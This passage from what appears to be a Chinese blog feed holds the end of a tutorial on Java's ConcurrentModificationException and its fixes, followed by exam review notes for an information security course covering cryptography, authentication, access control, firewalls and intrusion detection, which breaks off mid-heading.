</span>&#123;</span><br><span class="line">        checkForComodification();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            E next = get(cursor);</span><br><span class="line">            lastRet = cursor++;</span><br><span class="line">            <span class="keyword">return</span> next;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException e) &#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();           <span class="comment">// ①</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lastRet == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line">        checkForComodification();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AbstractList.<span class="keyword">this</span>.remove(lastRet);</span><br><span class="line">            <span class="keyword">if</span> (lastRet &lt; cursor)</span><br><span class="line">                cursor--;</span><br><span class="line">            lastRet = -<span class="number">1</span>;</span><br><span class="line">            expectedModCount = modCount;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();  <span class="comment">// ②</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();  <span class="comment">// ③</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个AbstractList的迭代器总共有三处会抛出ConcurrentModificationException。</p><p>先理解它是如何实现的：通过变量名字可以知道cursor代表当前指向的集合内元素，是下一次调用next()方法时会返回的元素。lastRet代表的是上一次返回的元素，用于删除方法。</p><p>剩下的expectedModCount就是产生这个异常的原因：它表示对List对象修改次数的期望值，初始值为modCount，而modCount是AbstractList类中的一个成员变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">transient</span> <span class="keyword">int</span> modCount = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这个变量表示对List的修改次数，查看ArrayList的add()和remove()方法就可以发现，每次调用add()方法或者remove()方法就会对modCount进行加1操作。</p><p>那么，遍历场景中抛出ConcurrentModificationException异常的原因就清晰了：由于在使用迭代器的过程中调用了ArrayList本身的remove方法，使modCount++，再调用迭代器的next()方法时通过checkForComodification()抛出了该异常，即代码③处。</p><h2 id="单线程解决方法-1"><a href="#单线程解决方法-1" class="headerlink" title="单线程解决方法 1"></a>单线程解决方法 1</h2><p>原文：参开资料1</p><p>若是单线程，简单明了，调用迭代器重新实现的remove就好啦，在里面迭代器更新了expectedModCount。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;Integer&gt; iterator = list.iterator();</span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">    Integer integer = iterator.next();</span><br><span class="line">    <span class="keyword">if</span>(integer==<span class="number">2</span>)</span><br><span class="line">        iterator.remove();   <span class="comment">// 呐</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者直接就不用迭代器，用for+局部变量i的形式遍历集合元素，用增强for循环不行，因为底层也是使用迭代器。</p><h2 id="单线程解决方法2"><a href="#单线程解决方法2" class="headerlink" title="单线程解决方法2"></a>单线程解决方法2</h2><p>原文：参考资料2</p><p>将ArrayList集合改为CopyOnWriteArrayList：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.CopyOnWriteArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/** 初始化集合类*/</span></span><br><span class="line">        CopyOnWriteArrayList&lt;TestObj&gt; list = <span class="keyword">new</span> CopyOnWriteArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> TestObj(i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 遍历时删除元素*/</span></span><br><span class="line">        <span class="keyword">for</span> (TestObj obj : list) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj.getValue() &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="comment">/** 这里不会抛出ConcurrentModificationException*/</span></span><br><span class="line">                list.remove(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="单线程两种方案比较"><a href="#单线程两种方案比较" class="headerlink" title="单线程两种方案比较"></a>单线程两种方案比较</h2><p>每一个方案都把上述操作执行一百万次，可以得到：</p><table><thead><tr><th>使用迭代器自带的remove方法</th><th>1919</th></tr></thead><tbody><tr><td>用CopyOnWriteArrayList替代</td><td>7013</td></tr></tbody></table><p>因此，单线程环境中推荐使用迭代器自带的remove方法来删除元素。</p><h2 id="多线程解决方案"><a href="#多线程解决方案" class="headerlink" title="多线程解决方案"></a>多线程解决方案</h2><p>若是多线程，这样写就不行了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line">        list.add(<span class="number">2</span>);</span><br><span class="line">        list.add(<span class="number">3</span>);</span><br><span class="line">        list.add(<span class="number">4</span>);</span><br><span class="line">        list.add(<span class="number">5</span>);</span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Iterator&lt;Integer&gt; iterator = list.iterator();</span><br><span class="line">                <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">                    Integer integer = iterator.next();</span><br><span class="line">                    System.out.println(integer);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        Thread thread2 = <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Iterator&lt;Integer&gt; iterator = list.iterator();</span><br><span class="line">                <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">                    Integer integer = iterator.next();</span><br><span class="line">                    <span class="keyword">if</span>(integer==<span class="number">2</span>)</span><br><span class="line">                        iterator.remove();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写还是会报ConcurrentModificationException异常，</p><p>有可能有朋友说ArrayList是非线程安全的容器，换成Vector就没问题了，实际上换成Vector还是会出现这种错误。</p><p>原因在于，虽然Vector的方法采用了synchronized进行了同步，但是由于Vector是继承的AbstarctList，因此通过Iterator来访问容器的话，事实上是不需要获取锁就可以访问。那么显然，由于使用iterator对容器进行访问不需要获取锁，在多线程中就会造成当一个线程删除了元素，由于modCount是AbstarctList的成员变量，因此可能会导致在其他线程中modCount和expectedModCount值不等。</p><p>就比如上面的代码中，很显然iterator是线程私有的，</p><p>初始时，线程1和线程2中的modCount、expectedModCount都为0，</p><p>当线程2通过iterator.remove()删除元素时，会修改modCount值为1，并且会修改线程2中的expectedModCount的值为1，</p><p>而此时线程1中的expectedModCount值为0，虽然modCount不是volatile变量，不保证线程1一定看得到线程2修改后的modCount的值，但是也有可能看得到线程2对modCount的修改，这样就有可能导致线程1中比较expectedModCount和modCount不等，而抛出异常。</p><p>因此一般有2种解决办法：</p><p>1）在使用iterator迭代的时候使用synchronized或者Lock进行同步；</p><p>2）与单线程一样，可以使用并发容器<strong>CopyOnWriteArrayList</strong>代替ArrayList和Vector；使用<strong>ConcurrentHashMap</strong>替换HashMap。</p><h1 id="2-集合类的toString-方法"><a href="#2-集合类的toString-方法" class="headerlink" title="2 集合类的toString()方法"></a>2 集合类的toString()方法</h1><p>原文：参考资料3</p><p>Vector的toString()方法中隐式地使用了迭代器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AbstractCollection.toString()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Iterator&lt;E&gt; it = iterator();</span><br><span class="line">    <span class="keyword">if</span> (! it.hasNext())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line"></span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    sb.append(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        E e = it.next();</span><br><span class="line">        sb.append(e == <span class="keyword">this</span> ? <span class="string">&quot;(this Collection)&quot;</span> : e);</span><br><span class="line">        <span class="keyword">if</span> (! it.hasNext())</span><br><span class="line">            <span class="keyword">return</span> sb.append(<span class="string">&#x27;]&#x27;</span>).toString();</span><br><span class="line">        sb.append(<span class="string">&#x27;,&#x27;</span>).append(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的代码中可以看出Vector调用了AbstractCollection.toString()方法，而AbstractCollection.toString()方法使用了迭代器遍历整个容器。</p><p>使用调用Vector.toString()方法时不会出现并发访问异常，因为Vector.toString()方法加锁了，当调用toString()方法时其它线程不能修改容器，因此不会抛出并发访问异常。但是ArrayList、LinkedList这些非线程安全的容器类就不能保证调用toString()方法的时候没有其它线程修改容器了，因此调用这些类的toString()方法有可能导致并发访问异常。</p><h2 id="避免异常的方法"><a href="#避免异常的方法" class="headerlink" title="避免异常的方法"></a><strong>避免异常的方法</strong></h2><p><strong>加锁</strong></p><p>避免异常的方法也不难，最简单的方式就是和Vector.toString()一样，我们每次调用迭代器的时候都对Vector的对象加锁即可。比如下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(vct) &#123;</span><br><span class="line">true<span class="keyword">for</span>(String str : vct) &#123;</span><br><span class="line">truetrueSystem.out.println(str);</span><br><span class="line">true&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以避免在遍历的时候其它线程对容器修改，但是如果容器特别大的时候会导致遍历容器需要等很久，而其它线程必须等待，这样就降低了系统的性能，因此这种解决方案并不是完美的。</p><p><strong>分段遍历</strong></p><p>另一种方式就是分段遍历容器，比如容器中一共有十万个元素，我们通过subList()方法先获得前一千个元素，遍历这个子集，然后再获得从一千到两千的元素……以此类推。但是这种方案也是有缺陷的，因为每次拿到的子集都相当于一个快照，在遍历子集的时候别的线程可能已经修改了这个容器，因此这种方法要求客户端代码对数据一致的敏感性不高，对敏感性高就只能使用加锁的方法。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在遍历集合类的元素时，若试图修改该集合则会报ConcurrentModifyException异常，本文介绍了该异常产生的各种情况、原因和解决方案。&lt;img src=&quot;/2021/What-caused-ConcurrentModifyException/image-20210707144719236-1625640442274.png&quot; alt=&quot;image-20210707144719236&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
    <category term="并发" scheme="https://www.fvolcano.red/tags/%E5%B9%B6%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>哈工大信息安全导论复习重点整理</title>
    <link href="https://www.fvolcano.red/2021/HIT-Information-Security-Review/"/>
    <id>https://www.fvolcano.red/2021/HIT-Information-Security-Review/</id>
    <published>2021-07-03T23:55:56.000Z</published>
    <updated>2021-07-03T23:55:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>2021年信息安全导论期末复习使用，根据老师给的重点整理。<a id="more"></a></p><p>2021期末：</p><p>单选：10分（每题2分，共5题）</p><p>填空：10分（每题2分，共5题）</p><p>简答题：30分（6题，每题5分）</p><p>计算题：15分（1题）</p><p>设计题：15分（1题）</p><p>辨析题：20分，每题10分</p><h1 id="1、-信息安全体系架构"><a href="#1、-信息安全体系架构" class="headerlink" title="1、 信息安全体系架构"></a>1、 信息安全体系架构</h1><h3 id="面向目标的知识体系结构"><a href="#面向目标的知识体系结构" class="headerlink" title="面向目标的知识体系结构"></a>面向目标的知识体系结构</h3><p>CIA三元组：机密性、完整性、可用性（正常使用不会被拒绝、可靠及时）</p><p>DAD三元组：泄露、篡改、破坏</p><h3 id="面向应用的层次型技术体系架构"><a href="#面向应用的层次型技术体系架构" class="headerlink" title="面向应用的层次型技术体系架构"></a>面向应用的层次型技术体系架构</h3><p>信息系统的基本要素：人员（管理安全）、信息（内容安全、数据安全）、系统（运行安全、物理安全）</p><h3 id="面向过程的信息安全保障体系"><a href="#面向过程的信息安全保障体系" class="headerlink" title="面向过程的信息安全保障体系"></a>面向过程的信息安全保障体系</h3><p>PDRR：保护、检测、反应、恢复</p><h3 id="OSI开放系统互连安全体系结构"><a href="#OSI开放系统互连安全体系结构" class="headerlink" title="OSI开放系统互连安全体系结构"></a>OSI开放系统互连安全体系结构</h3><p>安全服务</p><ul><li>鉴别服务</li><li>访问控制</li><li>数据机密性</li><li>数据完整性</li><li>抗抵赖性</li></ul><p>安全机制</p><ul><li>加密</li><li>数字签名（完整性和不可否认性）</li><li>访问控制</li><li>数据完整性</li><li>鉴别交换（身份认证）</li><li>业务流填充</li><li>路由控制</li><li>公证控制（第三方）</li></ul><h1 id="2、-密码体制的五要素"><a href="#2、-密码体制的五要素" class="headerlink" title="2、 密码体制的五要素"></a>2、 密码体制的五要素</h1><p>M明文空间 有限集</p><p>C密文空间 有限集</p><p>K密钥空间 一切可能</p><p>E加密算法 任意密钥有效计算</p><p>D解密算法 任意</p><h1 id="3、-仿射密码"><a href="#3、-仿射密码" class="headerlink" title="3、 仿射密码"></a>3、 仿射密码</h1><p>移位密码+乘数密码</p><p>Ek(m) = (k1m+k2)mod q</p><p>Dk(c) = k1^-1(c-k2)mod q</p><p>k1与q=26互素，k1、k2&lt;26</p><p>乘法逆元：k^-1*k mod q = 1</p><h1 id="4、-数据加密标准DES的算法结构和特点"><a href="#4、-数据加密标准DES的算法结构和特点" class="headerlink" title="4、 数据加密标准DES的算法结构和特点"></a>4、 数据加密标准DES的算法结构和特点</h1><p>运算：置换IP IP-1、函数Fk（异或、E/P扩张置换、S盒、置换P4）、密钥移位、SW交换函数（左四右四）、</p><p>特点：分组加密（密钥循环左移来使用）、密钥64（56+8）、加密解密密钥使用顺序相反、密码体制公开（安全性完全依赖于密钥的保密性）、每轮需要48位的密钥（56位计算而来）、被破解（密钥只有56位）、16轮相同运算（fk）</p><p>分组短、密钥短、密码生命周期短、运行速度慢</p><h1 id="5、-公钥密码的思想（数学描述）"><a href="#5、-公钥密码的思想（数学描述）" class="headerlink" title="5、 公钥密码的思想（数学描述）"></a>5、 公钥密码的思想（数学描述）</h1><p>利用单向陷门函数：给x计算y=fx容易；给y计算x困难；存在z，给定z时对于任何y计算x容易。</p><p>满足12为单向函数，3为陷门性，z陷门信息</p><h1 id="6、-离散对数问题"><a href="#6、-离散对数问题" class="headerlink" title="6、 离散对数问题"></a>6、 离散对数问题</h1><p>原根：可以从a的1到p-1次方 mod p得到1到p-1的一个排列；b = a^i mod p (1&lt;=i&lt;=p-1)    i为b的以a为基数模p的离散对数</p><p>已知其他计算b容易；已知其他计算i困难</p><h1 id="7、-Diffie-Hellman密钥交换协议"><a href="#7、-Diffie-Hellman密钥交换协议" class="headerlink" title="7、 Diffie-Hellman密钥交换协议"></a>7、 Diffie-Hellman密钥交换协议</h1><p>DH算法：利用离散对数，各取大数i1、i2，分别计算b传给对方，拿到对方的b再进行一次，结果为密钥。</p><h1 id="8、-RSA公钥算法"><a href="#8、-RSA公钥算法" class="headerlink" title="8、 RSA公钥算法"></a>8、 RSA公钥算法</h1><p>欧拉函数：由小于n且和n互素的正整数构成的元素个数。n = pq   f(n) = (p-1)(q-1)</p><p>欧拉定理：a与n互素，则a^f(n) = 1 mod n</p><p>大整数因子分解：将n分解为两个大素数p、q是困难的</p><p>RSA：分组密码，明文和密文都是0到n之间的整数</p><p>密钥生成：选择素数p、q，n = pq—选择整数e使e与f(n)互素且小于f(n)—计算d = 模f(n)下e的乘法逆元。公钥：e、n；私钥：d、n、p、q</p><p>加密：c = m^e mod n</p><p>解密：m = c^d mod n</p><p>书本P36例子</p><h1 id="9、-散列函数的特点和作用"><a href="#9、-散列函数的特点和作用" class="headerlink" title="9、 散列函数的特点和作用"></a>9、 散列函数的特点和作用</h1><p>将任意长信息映射成固定长散列值（消息摘要）</p><p>特点：弱（给定x难以找到x’ h值相同）、强（自定x，无论是否在X中，包括弱）无碰撞特性、单向性（逆函数求x不可行）</p><p>安全长度：128</p><p>作用：作为认证符，完成消息认证</p><h1 id="10、EMI、EMC、防电磁泄漏主要方法"><a href="#10、EMI、EMC、防电磁泄漏主要方法" class="headerlink" title="10、EMI、EMC、防电磁泄漏主要方法"></a>10、EMI、EMC、防电磁泄漏主要方法</h1><p>EMI：电磁干扰，无关的、不希望有的、不良影响的电磁发射</p><p>EMC：电磁兼容性，电子设备正常工作的电磁环境不与其他电子设备相互不影响</p><ul><li>屏蔽法（空域防护）</li><li>频域法（干扰频率剔除）</li><li>时域法（时间回避）</li></ul><h1 id="11、容错与容灾的概念及主要技术方法"><a href="#11、容错与容灾的概念及主要技术方法" class="headerlink" title="11、容错与容灾的概念及主要技术方法"></a>11、容错与容灾的概念及主要技术方法</h1><p>容错：即使出现错误，系统也能执行一组规定的程序，不会中断或被修改。</p><p>空闲设备（备份）、镜像（一份工作交给两个相同部件）、复现（延迟镜像，原系统和辅助系统）、负载均衡（子任务）</p><p>容灾：对偶然事故的预防和恢复。</p><p>对服务的维护和恢复；保护和恢复信息。</p><p>灾难恢复策略：做最坏打算、充分利用现有资源、注意灾前措施</p><h1 id="12、windows的网络认证"><a href="#12、windows的网络认证" class="headerlink" title="12、windows的网络认证"></a>12、windows的网络认证</h1><p>对称密钥加密、有效注册的合法用户、用户与主域控制器共享口令、在域控制器的安全用户管理数据库中保存用户名和口令的散列。</p><p>登录请求-用户端计算口令散列-域控制器发送8字节质询-两方都用口令散列对质询进行散列计算（加密）得到质询散列-域控制器对比</p><h1 id="13、利用公开密钥和对称密钥设计认证协议获得会话密钥"><a href="#13、利用公开密钥和对称密钥设计认证协议获得会话密钥" class="headerlink" title="13、利用公开密钥和对称密钥设计认证协议获得会话密钥"></a>13、利用公开密钥和对称密钥设计认证协议获得会话密钥</h1><p>对称密钥</p><p>挑战-应答：发送挑战—示证方通过共享密钥加密后发回—验证方通过共享密钥解密</p><p>Needham-S：加入第三方，认证服务器AS，密钥分配中心KDC，<strong>具体过程</strong>书本P58</p><p>Kerberos：AS+票据授予服务器TGS，<strong>具体过程</strong>书本P59</p><p>windows：知识点12</p><p>公开密钥</p><p>Needham-S：双向认证协议。过程：A用B的公钥加密自己的ID和挑战—B用私钥解开，用A的公钥加密发来的挑战和自己的挑战—A用私钥解开，用B的公钥加密B的挑战发回</p><p>基于CA数字证书：CA认证中心，数字证书：经过CA签名（私钥加密）的包含拥有者信息和公钥的文件。过程：申请颁发—使用私钥加密信息发送—接受方获得CA的公钥，用公钥对数字证书做合法性验证—获取发送方的公钥，验证信息的签名。</p><h1 id="14、Kerberos工作原理"><a href="#14、Kerberos工作原理" class="headerlink" title="14、Kerberos工作原理"></a>14、Kerberos工作原理</h1><p>三个阶段：完成身份认证，获得访问TGS的票据—获得访问应用服务器的票据—客户与服务器身份验证交换，获得服务。</p><p>书本P59</p><h1 id="15、PKI的体系结构及工作原理"><a href="#15、PKI的体系结构及工作原理" class="headerlink" title="15、PKI的体系结构及工作原理"></a>15、PKI的体系结构及工作原理</h1><p>体系结构：认证机构CA、证书库（供查询、分布式）、密钥备份及恢复、证书撤销处理（进入黑名单）、PKI应用接口（查询、路径处理、时间戳请求）</p><p>采用数字证书技术来管理公钥，通过第三方可信任机构——CA认证中心将用户公钥和其他信息绑定，用于验证用户身份。</p><h1 id="16、访问控制的概念"><a href="#16、访问控制的概念" class="headerlink" title="16、访问控制的概念"></a>16、访问控制的概念</h1><p>针对越权访问资源的防御措施，从而使系统资源在合法范围内使用。</p><p>基本组成元素：主体、客体、访问控制措施（主体对客体的访问规则集合）</p><h1 id="17、DAC、MAC、RBAC的工作原理及特点"><a href="#17、DAC、MAC、RBAC的工作原理及特点" class="headerlink" title="17、DAC、MAC、RBAC的工作原理及特点"></a>17、DAC、MAC、RBAC的工作原理及特点</h1><p>自主访问控制（三种存储方式，授权其他用户）、强制访问控制（基于多级安全需求、安全级别属性，四种形式）、基于角色（隔离用户和权限，即主体和客体操作，通过饰演不同角色来）</p><p>基本原则：最小特权原则、最小泄露原则、多级安全策略</p><h1 id="18、Windows安全体系结构、活动目录与组策略"><a href="#18、Windows安全体系结构、活动目录与组策略" class="headerlink" title="18、Windows安全体系结构、活动目录与组策略"></a>18、Windows安全体系结构、活动目录与组策略</h1><p>层次性，开始于<strong>用户认证</strong>（最外层），接着<strong>加密和访问控制</strong>，然后为<strong>审计和管理</strong>（系统的安全配置和事故处理），核心为<strong>安全策略</strong>。</p><p>安全主体：用户、组、计算机、域</p><p>安全子系统来提供安全性：服务 身份认证、访问控制、事件审计</p><p>安全参考监视器（SRM）：内核模式、身份认证、检查权限</p><p>本地安全机构（LSA）：用户模式、登录认证</p><p>活动目录：面向网络对象（用户、组、计算机、域、组织单元、安全策略、应用服务器）管理的综合目录服务。数据存储的视图、网络对象的索引集合</p><p>组策略：依据特定的用户或计算机的安全需求定制的安全配置规则。</p><p>针对每个OU指定不同的GP，存储在AD的相关数据库内，可以强制推送实施。</p><h1 id="19、传统病毒、蠕虫、木马的结构原理"><a href="#19、传统病毒、蠕虫、木马的结构原理" class="headerlink" title="19、传统病毒、蠕虫、木马的结构原理"></a>19、传统病毒、蠕虫、木马的结构原理</h1><p>传统：启动模块、传染、破坏   执行感染病毒的文件、传染其他文件</p><p>蠕虫：不需要寄生，计算机为载体网络为攻击对象、共享文件夹邮件恶意网页本地PE格式文件</p><p>木马：控制计算机为目的，下载安装、修改注册表、驻留内存、安装后门程序、设置开机加载，盗号网页点击下载代理，控制端程序+木马程序（服务器端，潜入）+木马配置程序</p><h1 id="20、拒绝服务攻击、缓冲区溢出：举例"><a href="#20、拒绝服务攻击、缓冲区溢出：举例" class="headerlink" title="20、拒绝服务攻击、缓冲区溢出：举例"></a>20、拒绝服务攻击、缓冲区溢出：举例</h1><p>DoS：目标系统某种破坏而不能提供服务。Ping of Death：包长度超过最大65536，TCPIP堆栈崩溃；tear drop：IP包偏移量重叠；Syn Flood：TCP连接不发送最后的ACK包；Smurf攻击：IP地址欺骗和ICMP协议，源地址为受害机广播ICMP ECHO包，源设为广播地址网络堵塞；电子邮件炸弹</p><p>填充的数据超过缓存区容量，覆盖其他数据。C strcpy</p><h1 id="21、防火墙主要技术概述"><a href="#21、防火墙主要技术概述" class="headerlink" title="21、防火墙主要技术概述"></a>21、防火墙主要技术概述</h1><p>包过滤防火墙：面向<strong>网络底层数据流</strong>进行审计和控管   <strong>网络层和传输层</strong></p><p>代理防火墙：基于<strong>代理技术</strong>，使防火墙参与到每一个内外网络之间的连接过程  还原审查后转发   <strong>应用层</strong></p><p>个人防火墙：一种能够保护个人计算机系统安全的<strong>软件</strong></p><p>ACL：一系列允许和拒绝匹配规则的集合（规则的顺序 matters）</p><p>静态包过滤：根据定义好的包过滤规则审查每个数据包   根据数据包的包头信息</p><p>动态包过滤：动态配置包过滤规则  根据需求添加或删除ACL   基于会话</p><p>应用代理网关：<strong>隔断直接的TCP连接</strong>   必须理解新协议、工作量大（<strong>应用层</strong>）</p><p>电路级网关：<strong>传输层</strong>上实施访问控制策略（不需要审计应用层，工作量小），内外网络建立虚拟电路</p><p>NAT：网络地址翻译，<strong>将私有地址转换为合法IP</strong>    解决IP地址不足的问题   静态动态NAT</p><p>VPN：虚拟专用网，穿过公用网络的安全稳定的隧道    隧道技术：一种协议完成另一种协议的数据封装、传输、解封</p><h1 id="22、Netfilter／iptables的工作原理"><a href="#22、Netfilter／iptables的工作原理" class="headerlink" title="22、Netfilter／iptables的工作原理"></a>22、Netfilter／iptables的工作原理</h1><p>两层结构：内核层的Netfilter组件：<strong>信息包过滤表组成</strong>。用户层的IPtables组件：<strong>管理包过滤规则的工具</strong>。</p><p><strong>Netfilter = 表-》链-》规则（存在优先级顺序）</strong>。</p><p>三个功能表：数据包过滤表Filter（input、forward、output三条链）、网络地址转换表Nat、数据包处理表Mangle。具体实现：在网络处理流程的若干位置放置一些钩子hook</p><p>包过滤表中的规则是通过IPtables的命令来进行管理的。</p><p><strong>IPtables命令 = 工作表+使用链+规则操作+目标动作+匹配条件。</strong></p><p>书本P114</p><h1 id="23、基于网络和基于主机的入侵检测系统的优缺点"><a href="#23、基于网络和基于主机的入侵检测系统的优缺点" class="headerlink" title="23、基于网络和基于主机的入侵检测系统的优缺点"></a>23、基于网络和基于主机的入侵检测系统的优缺点</h1><p><strong>基于主机：HIDS</strong>，分析系统的审计数据，数据来源为日志。</p><p>检测准确性高，可及时阻止入侵，性价比高，对网络流量不敏感，适合加密环境；与平台相关，每个主机都要安装，难以检测针对网络的攻击</p><p><strong>基于网络：NIDS</strong>，在网络关键位置部署感应器。</p><p>对用户透明，隐蔽性好，使用简便，不易遭受网络攻击，与平台无关，独立计算机，不会增加负载，攻击者不易转移证据；无法检测来自网络内部的攻击，无法分析加密数据，分析所有网络报文，主机负荷大 DoS</p><h1 id="24、snorts的工作原理"><a href="#24、snorts的工作原理" 